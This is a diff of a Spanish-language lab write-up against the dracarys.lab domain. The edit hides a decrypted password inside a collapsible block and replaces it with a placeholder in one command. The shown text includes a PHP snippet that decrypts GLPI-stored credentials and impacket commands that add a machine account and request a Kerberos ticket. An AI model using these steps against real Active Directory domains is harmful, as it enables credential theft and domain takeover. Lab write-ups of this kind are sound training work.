@@ -65,10 +65,18 @@ Un pequeño script PHP usando la clase `GLPIKey` nos da las credenciales en clar
 ```php
 $key = new GLPIKey();
 echo $key->decrypt($encrypted_password);
-// BSno5DP4tjJ4jIu8is3B
 ```
 
-Primeras credenciales de dominio: **sunfyre@dracarys.lab**
+<details markdown="1">
+<summary>🔓 Ver contraseña descifrada</summary>
+
+```
+BSno5DP4tjJ4jIu8is3B
+```
+
+</details>
+
+Primeras credenciales de dominio: **`sunfyre@dracarys.lab`**
 
 ---
 
@@ -96,7 +104,7 @@ Esto nos permite hacer lo siguiente:
 
 ```bash
 addcomputer.py -computer-name 'root$' -computer-pass 'Password123!' \
-  'dracarys.lab/sunfyre:BSno5DP4tjJ4jIu8is3B' -dc-ip 10.10.10.10
+  'dracarys.lab/sunfyre:<contraseña>' -dc-ip 10.10.10.10
 
 getTGT.py -dc-ip 10.10.10.10 'dracarys.lab/root:Password123!'
 
